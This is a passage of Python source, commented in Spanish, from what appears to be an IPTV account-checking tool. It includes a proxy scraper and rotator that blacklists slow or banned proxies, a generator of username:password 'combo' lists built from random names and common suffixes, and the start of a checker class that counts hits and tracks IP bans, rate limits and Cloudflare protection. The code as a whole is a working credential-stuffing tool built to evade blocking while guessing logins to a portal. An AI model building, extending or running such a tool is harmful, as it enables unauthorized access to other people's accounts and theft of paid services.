                        if current_time - until_time > 60:  
                            to_remove.append(proxy_str)

                    for proxy_str in to_remove:
                        del self.quarantine_proxies[proxy_str]
                        logger.info(f"Proxy liberado de cuarentena por recuperación: {proxy_str}")

                else:
                    logger.warning("No se puede forzar rotación - solo hay un proxy")

        except Exception as e:
            logger.error(f"Error en rotación forzada: {e}")

    def blacklist_slow_proxy(self, proxy, reason="timeout"):
        """NUEVO: Blacklistea inmediatamente un proxy lento"""
        if not proxy:
            return

        proxy_str = self._proxy_to_str(proxy)
        if proxy_str not in self.blacklisted_proxies:
            self.blacklisted_proxies.add(proxy_str)
            logger.warning(f"PROXY BLACKLISTED: {proxy_str} (reason: {reason})")

            self.quarantine_proxies[proxy_str] = time.time()

            self.proxy_scores[proxy_str] = 0

    def check_proxy_timeout(self, proxy, start_time):
        """NUEVO: Verifica si un proxy tardó demasiado y lo blacklistea"""
        if not self.hard_timeout_enabled:
            return False

        elapsed = time.time() - start_time
        if elapsed > self.max_proxy_timeout:
            self.blacklist_slow_proxy(proxy, f"timeout_{elapsed:.1f}s")
            return True
        return False

    def should_force_rotate(self):
        """NUEVO: Verifica si debe forzar rotación por tiempo"""
        current_time = time.time()
        if current_time - self.last_forced_rotation > self.force_rotation_seconds:
            self.last_forced_rotation = current_time
            return True
        return False

    def is_proxy_blacklisted(self, proxy):
        """NUEVO: Verifica si un proxy está en blacklist"""
        if not proxy:
            return False
        proxy_str = self._proxy_to_str(proxy)
        return proxy_str in self.blacklisted_proxies

    def is_good_proxy(self, proxy):
        """Verifica si un proxy está en la lista de buenos"""
        if not proxy:
            return False

        proxy_str = self._proxy_to_str(proxy)
        return proxy_str in self.good_proxies

    def is_bad_proxy(self, proxy):
        """Verifica si un proxy está en la lista de malos"""
        if not proxy:
            return False

        proxy_str = self._proxy_to_str(proxy)
        return proxy_str in self.bad_proxies

    def _update_proxy_stats(self):
        """Actualiza las estadísticas de proxies"""
        with self.lock:
            current_time = time.time()

            self.proxy_stats['good'] = len([p for p in self.active_proxies 
                                          if self.proxy_scores.get(self._proxy_to_str(p), 50) > 60])
            self.proxy_stats['bad'] = len([p for p in self.active_proxies 
                                         if self.proxy_scores.get(self._proxy_to_str(p), 50) < 30])
            self.proxy_stats['quarantine'] = len([p for p, until in self.quarantine_proxies.items() 
                                                if current_time < until])

    def get_proxy_stats_str(self):
        """Devuelve una cadena con estadísticas de proxies actualizadas"""
        self._update_proxy_stats()

        total = len(self.active_proxies)
        good = self.proxy_stats['good']
        bad = self.proxy_stats['bad']
        quarantine = self.proxy_stats['quarantine']

        if total == 0:
            return f"{Colors.RED}Sin proxies disponibles{Colors.RESET}"

        stats = f" Proxies: {Colors.CYAN}Total {total}{Colors.RESET} | "
        stats += f"{Colors.GREEN}Buenos {good}{Colors.RESET} | "
        stats += f"{Colors.RED}Malos {bad}{Colors.RESET}"

        if quarantine > 0:
            stats += f" | {Colors.YELLOW}Cuarentena {quarantine}{Colors.RESET}"

        return stats

    def download_proxies(self, proxy_type):
        """Descarga proxies desde Internet según el tipo especificado - versión optimizada"""
        print(f"{Colors.CYAN}Descargando proxies {proxy_type} desde Internet...{Colors.RESET}")

        if proxy_type.lower() in ['http', 'https', 'h']:
            protocol = 'http'
            urls = [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
                'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt',
                'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
                'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
                'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
                'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
                'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
                'https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt',
                'https://www.proxy-list.download/api/v1/get?type=http',
                'https://www.proxyscan.io/download?type=http',
                'http://spys.me/proxy.txt',
                'https://rootjazz.com/proxies/proxies.txt',
                'https://sunny9577.github.io/proxy-scraper/proxies.txt',
                'https://free-proxy-list.net/anonymous-proxy.html'
            ]
        elif proxy_type.lower() in ['socks4', '4']:
            protocol = 'socks4'
            urls = [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all',
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
                'https://raw.githubusercontent.com/roosterkid/openproxylist/main/socks4.txt',
                'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt',
                'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt',
                'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
                'https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks4.txt',
                'https://www.proxy-list.download/api/v1/get?type=socks4',
                'https://www.proxyscan.io/download?type=socks4',
                'https://proxyspace.pro/socks4.txt',
                'https://www.socks-proxy.net/',
                'https://www.freeproxychecker.com/result/socks4_proxies.txt',
                'https://freeproxylist.cc/online/socks4.txt'
            ]
        elif proxy_type.lower() in ['socks5', '5']:
            protocol = 'socks5'
            urls = [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
                'https://raw.githubusercontent.com/roosterkid/openproxylist/main/socks5.txt',
                'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
                'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt',
                'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
                'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
                'https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks5.txt',
                'https://www.proxy-list.download/api/v1/get?type=socks5',
                'https://www.proxyscan.io/download?type=socks5',
                'https://proxyspace.pro/socks5.txt',
                'https://www.freeproxychecker.com/result/socks5_proxies.txt',
                'https://freeproxylist.cc/online/socks5.txt',
                'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt'
            ]
        else:
            print(f"{Colors.RED}Tipo de proxy no válido. Use 'http', 'socks4' o 'socks5'.{Colors.RESET}")
            return None

        proxies = []
        success_count = 0

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

        session.verify = False
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        print(f"\n{Colors.CYAN}Iniciando descarga desde {len(urls)} fuentes...{Colors.RESET}")

        progress_width = 30

        def extract_proxies_from_content(content):
            import re

            found_proxies = []

            pattern1 = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})')
            found_proxies.extend(pattern1.findall(content))

            if '<table' in content.lower() and '<tr' in content.lower():
                try:
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(content, 'html.parser')
                    for row in soup.find_all('tr'):
                        cells = row.find_all('td')
                        if len(cells) >= 2:
                            ip = cells[0].text.strip()
                            port = cells[1].text.strip()
                            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip) and port.isdigit():
                                found_proxies.append(f"{ip}:{port}")
                except ImportError:

                    pattern2 = re.compile(r'<td[^>]*>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td>\s*<td[^>]*>(\d+)</td>')
                    for match in pattern2.findall(content):
                        found_proxies.append(f"{match[0]}:{match[1]}")

            if not found_proxies and not '<html' in content.lower():
                lines = content.split('\n')
                for line in lines:
                    line = line.strip()

                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', line):
                        found_proxies.append(line)

            return found_proxies

        for i, url in enumerate(urls):
            try:

                percent = ((i + 1) / len(urls)) * 100
                filled_length = int(progress_width * (i + 1) // len(urls))
                bar = '█' * filled_length + '░' * (progress_width - filled_length)
                print(f"\r{Colors.GREEN}Progreso: |{bar}| {percent:.1f}% - Fuente {i+1}/{len(urls)}{Colors.RESET}", end='')

                try:
                    response = session.get(url, timeout=2)  

                    if response.status_code == 200:

                        content = response.text
                        proxy_list = extract_proxies_from_content(content)

                        proxies.extend(proxy_list)
                        if proxy_list:
                            success_count += 1

                            print(f"\r{Colors.GREEN}Progreso: |{bar}| {percent:.1f}% - Fuente {i+1}/{len(urls)} - {len(proxy_list)} proxies{Colors.RESET}", end='')
                except requests.exceptions.RequestException:

                    try:
                        simple_response = requests.get(url, timeout=2, verify=False)
                        if simple_response.status_code == 200:
                            content = simple_response.text
                            proxy_list = extract_proxies_from_content(content)
                            proxies.extend(proxy_list)
                            if proxy_list:
                                success_count += 1
                    except:
                        continue

            except Exception as e:

                continue

        print(f"\n{Colors.GREEN}Descarga completada. Se obtuvieron proxies de {success_count}/{len(urls)} fuentes.{Colors.RESET}")

        if proxies:

            import re
            valid_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$')
            filtered_proxies = [p for p in proxies if valid_pattern.match(p)]

            unique_proxies = list(set(filtered_proxies))
            timestamp = datetime.now().strftime("%Y%m%d_%H%M")
            filename = f"Proxies/downloaded_{protocol}_{timestamp}.txt"

            if not os.path.exists('Proxies'):
                os.makedirs('Proxies')

            with open(filename, 'w', encoding='utf-8') as f:
                for proxy in unique_proxies:
                    f.write(f"{proxy}\n")

            total_proxies = len(unique_proxies)
            print(f"{Colors.GREEN}¡Éxito! Se descargaron {total_proxies} proxies únicos.{Colors.RESET}")
            print(f"{Colors.GREEN}Proxies guardados en: {filename}{Colors.RESET}")
            print(f"{Colors.YELLOW}Nota: Se descargaron {len(proxies)} proxies y se filtraron {len(proxies) - total_proxies} duplicados.{Colors.RESET}")

            return filename
        else:
            print(f"{Colors.RED}No se pudieron descargar proxies. Intente más tarde o utilice otra fuente.{Colors.RESET}")
            return None 

    def show_proxy_menu(self):
        """Muestra el menú de selección de proxies con detección inteligente"""

        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}SELECCIÓN DE CARPETA DE PROXIES{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        print(f"{Colors.YELLOW}[1] Usar carpeta predeterminada (Proxies/){Colors.RESET}")
        print(f"{Colors.YELLOW}[2] Seleccionar carpeta con explorador{Colors.RESET}")
        print(f"{Colors.YELLOW}[0] Cancelar{Colors.RESET}\n")

        folder_choice = input(f"{Colors.GREEN}Seleccione una opción [0-2]: {Colors.RESET}")

        proxy_dir = 'Proxies'

        if folder_choice == '2':
            try:
                import tkinter as tk
                from tkinter import filedialog

                root = tk.Tk()
                root.withdraw()
                root.attributes('-topmost', True)

                custom_path = filedialog.askdirectory(
                    title="Seleccione la carpeta de proxies",
                    initialdir=os.getcwd()
                )

                root.destroy()

                if custom_path and os.path.exists(custom_path) and os.path.isdir(custom_path):
                    proxy_dir = custom_path
                    print(f"{Colors.GREEN}✓ Usando carpeta personalizada: {proxy_dir}{Colors.RESET}")
                elif custom_path:
                    print(f"{Colors.RED}✗ La ruta no existe o no es una carpeta válida{Colors.RESET}")
                    print(f"{Colors.YELLOW}Usando carpeta predeterminada: Proxies/{Colors.RESET}")
                    proxy_dir = 'Proxies'
                else:
                    print(f"{Colors.YELLOW}Selección cancelada. Usando carpeta predeterminada: Proxies/{Colors.RESET}")
                    proxy_dir = 'Proxies'
            except ImportError:
                print(f"{Colors.RED}✗ tkinter no está disponible. Ingrese la ruta manualmente:{Colors.RESET}")
                custom_path = input(f"\n{Colors.GREEN}Ingrese la ruta de la carpeta (ej: C:\\proxies o D:\\socks5): {Colors.RESET}").strip()
                if custom_path and os.path.exists(custom_path) and os.path.isdir(custom_path):
                    proxy_dir = custom_path
                    print(f"{Colors.GREEN}✓ Usando carpeta personalizada: {proxy_dir}{Colors.RESET}")
                elif custom_path:
                    print(f"{Colors.RED}✗ La ruta no existe o no es una carpeta válida{Colors.RESET}")
                    print(f"{Colors.YELLOW}Usando carpeta predeterminada: Proxies/{Colors.RESET}")
                    proxy_dir = 'Proxies'
            except Exception as e:
                print(f"{Colors.RED}✗ Error al abrir selector de carpetas: {e}{Colors.RESET}")
                print(f"{Colors.YELLOW}Usando carpeta predeterminada: Proxies/{Colors.RESET}")
                proxy_dir = 'Proxies'
        elif folder_choice == '0':
            return None, None

        if not os.path.exists(proxy_dir):
            os.makedirs(proxy_dir)

        print(f"\n{Colors.CYAN}Opciones de proxies:{Colors.RESET}")
        print(f"{Colors.YELLOW}1. Usar archivo de proxies existente")
        print(f"2. Verificar proxies contra portal específico")
        print(f"3. Descargar proxies nuevos")
        print(f"0. Cancelar{Colors.RESET}")

        choice = input(f"\n{Colors.GREEN}Elija una opción: {Colors.RESET}")

        try:
            choice = int(choice)

            if choice == 0:
                return None, None

            elif choice == 1:

                proxy_files = [f for f in os.listdir(proxy_dir) if f.endswith('.txt')]

                if not proxy_files:
                    print(f"{Colors.YELLOW}No se encontraron archivos de proxies en {proxy_dir}/{Colors.RESET}")
                    return None, None

                print(f"\n{Colors.CYAN}Archivos de proxies disponibles en {proxy_dir}/{Colors.RESET}")
                for i, file in enumerate(proxy_files):

                    is_verified = self._detect_portal_verified_file(os.path.join(proxy_dir, file))
                    status = f"{Colors.GREEN}[VERIFICADO]{Colors.RESET}" if is_verified else f"{Colors.YELLOW}[SIN VERIFICAR]{Colors.RESET}"
                    print(f"{Colors.YELLOW}{i + 1}. {file} {status}{Colors.RESET}")

                file_choice = input(f"\n{Colors.GREEN}Ingrese el número de archivo (0 para cancelar): {Colors.RESET}")

                try:
                    file_choice = int(file_choice)
                    if file_choice == 0:
                        return None, None

                    if 1 <= file_choice <= len(proxy_files):
                        selected_file = os.path.join(proxy_dir, proxy_files[file_choice - 1])

                        if self._detect_portal_verified_file(selected_file):
                            print(f"\n{Colors.GREEN}[OK] Archivo ya verificado contra portal especifico.{Colors.RESET}")
                            print(f"{Colors.CYAN}Cargando directamente...{Colors.RESET}")

                            print(f"\n{Colors.CYAN}Tipos de Proxy:{Colors.RESET}")
                            print(f"{Colors.YELLOW}1. SOCKS5")
                            print(f"2. SOCKS4") 
                            print(f"3. HTTP")
                            print(f"4. IPVanish (SOCKS5 con auth){Colors.RESET}")

                            proxy_type_choice = input(f"\n{Colors.GREEN}Seleccione el tipo de proxy: {Colors.RESET}")

                            proxy_types = {
                                '1': 'socks5',
                                '2': 'socks4', 
                                '3': 'http',
                                '4': 'socks5'
                            }

                            if proxy_type_choice in proxy_types:
                                return selected_file, proxy_types[proxy_type_choice]
                        else:

                            print(f"\n{Colors.YELLOW}Este archivo no ha sido verificado contra ningún portal específico.{Colors.RESET}")
                            verify_choice = input(f"{Colors.YELLOW}¿Desea verificarlo ahora? (s/n, RECOMENDADO): {Colors.RESET}").lower()

                            if verify_choice == 's':

                                print(f"\n{Colors.CYAN}Tipos de Proxy:{Colors.RESET}")
                                print(f"{Colors.YELLOW}1. SOCKS5")
                                print(f"2. SOCKS4")
                                print(f"3. HTTP") 
                                print(f"4. IPVanish (SOCKS5 con auth){Colors.RESET}")

                                proxy_type_choice = input(f"\n{Colors.GREEN}Seleccione el tipo de proxy: {Colors.RESET}")

                                proxy_types = {
                                    '1': 'socks5',
                                    '2': 'socks4',
                                    '3': 'http', 
                                    '4': 'socks5'
                                }

                                if proxy_type_choice in proxy_types:
                                    proxy_type = proxy_types[proxy_type_choice]

                                    portal = input(f"\n{Colors.GREEN}Ingrese el portal IPTV para verificar (ej: moontools.me:8080): {Colors.RESET}")

                                    if portal.strip():

                                        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
                                            raw_proxies = [line.strip() for line in f if line.strip()]

                                        print(f"{Colors.CYAN}Verificando {len(raw_proxies)} proxies contra {portal}...{Colors.RESET}")

                                        if self.verify_proxies_against_portal(raw_proxies, proxy_type, portal):
                                            return selected_file, proxy_type
                                        else:
                                            print(f"{Colors.RED}No se encontraron proxies válidos para el portal {portal}{Colors.RESET}")
                                            return None, None
                            else:

                                print(f"\n{Colors.CYAN}Tipos de Proxy:{Colors.RESET}")
                                print(f"{Colors.YELLOW}1. SOCKS5")
                                print(f"2. SOCKS4")
                                print(f"3. HTTP")
                                print(f"4. IPVanish (SOCKS5 con auth){Colors.RESET}")

                                proxy_type_choice = input(f"\n{Colors.GREEN}Seleccione el tipo de proxy: {Colors.RESET}")

                                proxy_types = {
                                    '1': 'socks5',
                                    '2': 'socks4',
                                    '3': 'http',
                                    '4': 'socks5'
                                }

                                if proxy_type_choice in proxy_types:
                                    return selected_file, proxy_types[proxy_type_choice]
                except:
                    pass

                return None, None

            elif choice == 2:

                return self._verify_proxies_against_specific_portal()

            elif choice == 3:

                print(f"\n{Colors.CYAN}Tipos de Proxy para descargar:{Colors.RESET}")
                print(f"{Colors.YELLOW}1. SOCKS5")
                print(f"2. SOCKS4")
                print(f"3. HTTP{Colors.RESET}")

                download_choice = input(f"\n{Colors.GREEN}Seleccione el tipo de proxy a descargar: {Colors.RESET}")

                proxy_types = {
                    '1': 'socks5',
                    '2': 'socks4',
                    '3': 'http'
                }

                if download_choice in proxy_types:
                    proxy_type = proxy_types[download_choice]
                    downloaded_file = self.download_proxies(proxy_type)

                    if downloaded_file:
                        return downloaded_file, proxy_type

        except:
            pass

        return None, None

    def _verify_proxies_against_specific_portal(self):
        """Verifica proxies contra un portal específico"""

        proxy_files = [f for f in os.listdir('Proxies') if f.endswith('.txt')]

        if not proxy_files:
            print(f"{Colors.YELLOW}No se encontraron archivos de proxies.{Colors.RESET}")
            return None, None

        print(f"\n{Colors.CYAN}Archivos de proxies disponibles:{Colors.RESET}")
        for i, file in enumerate(proxy_files):
            print(f"{Colors.YELLOW}{i + 1}. {file}{Colors.RESET}")

        file_choice = input(f"\n{Colors.GREEN}Seleccione archivo de proxies: {Colors.RESET}")

        try:
            file_choice = int(file_choice)
            if 1 <= file_choice <= len(proxy_files):
                selected_file = os.path.join('Proxies', proxy_files[file_choice - 1])

                print(f"\n{Colors.CYAN}Tipos de Proxy:{Colors.RESET}")
                print(f"{Colors.YELLOW}1. SOCKS5")
                print(f"2. SOCKS4") 
                print(f"3. HTTP{Colors.RESET}")

                proxy_type_choice = input(f"\n{Colors.GREEN}Tipo de proxy: {Colors.RESET}")

                proxy_types = {'1': 'socks5', '2': 'socks4', '3': 'http'}

                if proxy_type_choice in proxy_types:
                    proxy_type = proxy_types[proxy_type_choice]

                    portal = input(f"\n{Colors.GREEN}Ingrese el portal IPTV (ej: moontools.me:8080): {Colors.RESET}")

                    if portal.strip():

                        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
                            raw_proxies = [line.strip() for line in f if line.strip()]

                        print(f"{Colors.CYAN}Cargando {len(raw_proxies)} proxies del archivo...{Colors.RESET}")

                        if self.verify_proxies_against_portal(raw_proxies, proxy_type, portal):
                            return selected_file, proxy_type
                        else:
                            print(f"{Colors.RED}No se encontraron proxies válidos para el portal {portal}{Colors.RESET}")
                            return None, None
        except:
            pass

        return None, None

class ComboMaker:
    """Genera combinaciones de usuario y contraseña"""

    def __init__(self):
        self.special_chars = ['', '.', '_', '-']
        self.numbers = ['', '123', '12345', '123456', '12', '1234', '1']
        self.years = ['', '2020', '2021', '2022', '2023', '2024']

    def generate_name(self):
        """Genera un nombre aleatorio"""
        return names.get_first_name().lower()

    def generate_last_name(self):
        """Genera un apellido aleatorio"""
        return names.get_last_name().lower()

    def format_combo(self, user, passw, tipo):
        """Formatea el combo según el tipo especificado"""
        if tipo == 1:  
            return f"{user}:{user}\n"
        elif tipo == 2:  
            parts = user.split('.')
            if len(parts) == 2:
                return f"{user}:{parts[1]}.{parts[0]}\n"
            return f"{user}:{user}\n"
        elif tipo == 3:  
            return f"{user}:{user}\n"
        elif tipo == 4:  
            return f"{user}:{passw}\n"
        elif tipo == 5:  
            return f"{user}:{passw}\n"

    def generate_variations(self, first, last=''):
        """Genera variaciones de nombres"""
        variations = []

        for char in self.special_chars:

            if last:
                variations.append(f"{first}{char}{last}")
            else:
                variations.append(first)

            for num in self.numbers:
                if last:
                    variations.append(f"{first}{char}{last}{num}")
                else:
                    variations.append(f"{first}{num}")

            for year in self.years:
                if last:
                    variations.append(f"{first}{char}{last}{year}")
                else:
                    variations.append(f"{first}{year}")

        return variations

    def generate_combos(self, amount, tipo, suffix=''):
        """Genera la cantidad especificada de combos"""
        combos = ""
        processed = set()  

        while len(processed) < amount:
            first = self.generate_name()
            last = self.generate_last_name() if tipo in [1, 2, 4] else ""

            variations = self.generate_variations(first, last)
            for var in variations:
                if len(processed) >= amount:
                    break

                if var not in processed:
                    passw = var
                    if tipo == 4 or tipo == 5:  
                        passw = f"{var}{suffix}" if suffix else var

                    combo = self.format_combo(var, passw, tipo)
                    if combo:
                        combos += combo
                        processed.add(var)

        return combos

    def generate_combo_menu(self):
        """Muestra el menú de generación de combo y genera el archivo"""
        print(f"\n{Colors.CYAN}Generador de Combo{Colors.RESET}")
        print(f"""
    {Colors.YELLOW}Elija el tipo de combo a generar:
    1. nombreapellido:nombreapellido
    2. nombreapellido:apellidonombre
    3. nombre:nombre
    4. nombreapellido:nombreapellido+sufijo
    5. nombre:nombre+sufijo{Colors.RESET}
        """)

        try:

            combo_type = int(input(f"{Colors.GREEN}Ingrese una opción: {Colors.RESET}"))
            if not 1 <= combo_type <= 5:
                print(f"{Colors.RED}Opción no válida{Colors.RESET}")
                return None

            amount = int(input(f"{Colors.GREEN}Ingrese cantidad de combinaciones a generar: {Colors.RESET}"))
            if amount <= 0:
                print(f"{Colors.RED}Cantidad no válida{Colors.RESET}")
                return None
            suffix = ""
            if combo_type in [4, 5]:
                suffix = input(f"{Colors.GREEN}Ingrese sufijo: {Colors.RESET}")

            print(f"{Colors.CYAN}Generando {amount} combinaciones... Por favor espere.{Colors.RESET}")

            widgets = [
                f'{Colors.GREEN}Generando combo... {Colors.RESET}',
                progressbar.AnimatedMarker()
            ]
            bar = progressbar.ProgressBar(widgets=widgets).start()

            for i in range(50):  
                time.sleep(0.05)
                bar.update(i)

            combos = self.generate_combos(amount, combo_type, suffix)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M")
            filename = f"combo/RandomNames_{timestamp}.txt"

            with open(filename, "w", encoding='utf-8') as f:
                f.write(combos)

            bar.finish()

            print(f"\n{Colors.GREEN}Combo generado exitosamente y guardado en {filename}{Colors.RESET}")

            return filename
        except ValueError:
            print(f"{Colors.RED}Por favor ingrese un valor numérico válido{Colors.RESET}")
            return None
        except Exception as e:
            logger.error(f"Error generando combo: {e}")
            print(f"{Colors.RED}Error generando combo: {str(e)}{Colors.RESET}")
            return None

class ProxyHealthMonitor:
    """Monitor de salud de proxies en tiempo real"""

    def __init__(self, check_interval=10):
        self.active_proxies = {}  
        self.check_interval = check_interval
        self.lock = threading.RLock()

    def mark_proxy_active(self, proxy):
        """Marca un proxy como activo"""
        with self.lock:
            self.active_proxies[self._proxy_to_str(proxy)] = time.time()

    def is_proxy_stale(self, proxy, max_age=20):
        """Verifica si un proxy lleva mucho tiempo sin responder"""
        with self.lock:
            proxy_str = self._proxy_to_str(proxy)
            last_active = self.active_proxies.get(proxy_str, 0)
            return (time.time() - last_active) > max_age

    def _proxy_to_str(self, proxy):
        """Convierte proxy dict a string"""
        if not proxy:
            return ""
        http_proxy = proxy.get('http', '')
        if http_proxy:
            return http_proxy.split('://')[-1].split('@')[-1]
        return ""

def get_country_flag(country_code):
    """Obtiene emoji de bandera del país"""

    flag_map = {
        'US': '🇺🇸', 'MX': '🇲🇽', 'CA': '🇨🇦', 'GB': '🇬🇧', 'ES': '🇪🇸', 'FR': '🇫🇷', 'DE': '🇩🇪', 'IT': '🇮🇹',
        'BR': '🇧🇷', 'AR': '🇦🇷', 'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'CL': '🇨🇱', 'EC': '🇪🇨', 'BO': '🇧🇴',
        'UY': '🇺🇾', 'PY': '🇵🇾', 'GY': '🇬🇾', 'SR': '🇸🇷', 'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹', 'HN': '🇭🇳',
        'SV': '🇸🇻', 'NI': '🇳🇮', 'BZ': '🇧🇿', 'JM': '🇯🇲', 'CU': '🇨🇺', 'DO': '🇩🇴', 'HT': '🇭🇹', 'PR': '🇵🇷',
        'CN': '🇨🇳', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳', 'TH': '🇹🇭', 'PH': '🇵🇭', 'SG': '🇸🇬', 'MY': '🇲🇾',
        'ID': '🇮🇩', 'VN': '🇻🇳', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'RU': '🇷🇺', 'UA': '🇺🇦', 'PL': '🇵🇱', 'CZ': '🇨🇿',
        'SK': '🇸🇰', 'HU': '🇭🇺', 'RO': '🇷🇴', 'BG': '🇧🇬', 'HR': '🇭🇷', 'SI': '🇸🇮', 'BA': '🇧🇦', 'RS': '🇷🇸',
        'ME': '🇲🇪', 'MK': '🇲🇰', 'AL': '🇦🇱', 'GR': '🇬🇷', 'TR': '🇹🇷', 'CY': '🇨🇾', 'MT': '🇲🇹', 'NL': '🇳🇱',
        'BE': '🇧🇪', 'LU': '🇱🇺', 'CH': '🇨🇭', 'AT': '🇦🇹', 'DK': '🇩🇰', 'SE': '🇸🇪', 'NO': '🇳🇴', 'FI': '🇫🇮',
        'IS': '🇮🇸', 'IE': '🇮🇪', 'PT': '🇵🇹', 'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'LY': '🇱🇾', 'EG': '🇪🇬',
        'ZA': '🇿🇦', 'NG': '🇳🇬', 'KE': '🇰🇪', 'GH': '🇬🇭', 'ET': '🇪🇹', 'UG': '🇺🇬', 'TZ': '🇹🇿', 'ZW': '🇿🇼',
        'IL': '🇮🇱', 'SA': '🇸🇦', 'AE': '🇦🇪', 'QA': '🇶🇦', 'KW': '🇰🇼', 'BH': '🇧🇭', 'OM': '🇴🇲', 'JO': '🇯🇴',
        'LB': '🇱🇧', 'SY': '🇸🇾', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'AF': '🇦🇫', 'PK': '🇵🇰', 'BD': '🇧🇩', 'LK': '🇱🇰',
        'MV': '🇲🇻', 'NP': '🇳🇵', 'BT': '🇧🇹', 'MM': '🇲🇲', 'KH': '🇰🇭', 'LA': '🇱🇦', 'TW': '🇹🇼', 'HK': '🇭🇰',
        'MO': '🇲🇴'
    }

    if country_code and country_code.upper() in flag_map:
        return flag_map[country_code.upper()]

    try:
        if flag and country_code:
            return flag.flag(country_code)
    except:
        pass

    return "🌍"

class IPTVChecker:
    """Clase principal para verificación de servicios IPTV"""

    def __init__(self):

        self.stats = {
            'total': 0,
            'checked': 0,
            'checked_this_session': 0,  
            'hits': 0,
            'fails': 0,
            'custom': 0,
            'retries': 0,
            'remaining': 0
        }

        self.task_queue = queue.Queue()
        self.retry_queue = queue.Queue()
        self.results = []

        self.portal = ""
        self.protocol = "http"
        self.combo_file = ""
        self.combo_lines = []
        self.start_position = 0
        self.credentials_processor = None
        self.use_telegam = False
        self.get_categories = False
        self.location = ""

        self.running = False
        self.thread_count = 1
        self.threads = []
        self.lock = threading.RLock()
        self.screen_lock = threading.Lock()
        self.start_time = None
        self.last_update_time = 0
        self.update_interval = 0.5  

        self.live_count = ""
        self.vod_count = ""
        self.series_count = ""
        self.categories = ""  
        self.hit_data = ""
        self.retries_text = ""

        self.current_proxy = None
        self.current_user = ""
        self.current_pass = ""

        self.ip_banned = False
        self.ip_banned_message = ""

        self.error_limit_reached = False
        self.user_wants_to_continue = True
        self.error_check_lock = threading.Lock()
        self.ip_banned_time = 0
        self.ip_banned_timeout = 5 

        self.rate_limited_domains = set()
        self.domain_request_history = {}  
        self.domain_delays = {}  

        self.portal_verified_proxies = False
        self._portal_proxy_cache = {}
        self._is_cloudflare_protected = False

        self._anti_spam_domains = set([
            'smarttvpanel.com', 
            'castlempire.site'
        ])
        self._response_history = {} 

        self.last_proxy_rotation = time.time()
        self.proxy_rotation_interval = 1  

        self.server_content_cache = {
            'live_count': None,
            'vod_count': None, 
            'series_count': None,
            'categories': None,
            'last_user': None,
            'cache_time': 0,
            'cache_duration': 300  
        }

        self.global_live_count = None
        self.global_vod_count = None
        self.global_series_count = None
        self.global_categories = None

        self.verified_accounts = set()  
        self.retry_accounts = set()     
        self.processing_retries = False 

        self.retry_stats = {
            'attempts': 0,
            'resolved': 0,
            'failed': 0
        }

        global logger
        if logger is None:
            import logging
            logger = logging.getLogger()
            if not logger.handlers:
                logger.addHandler(logging.StreamHandler())
                logger.setLevel(logging.INFO)

        try:
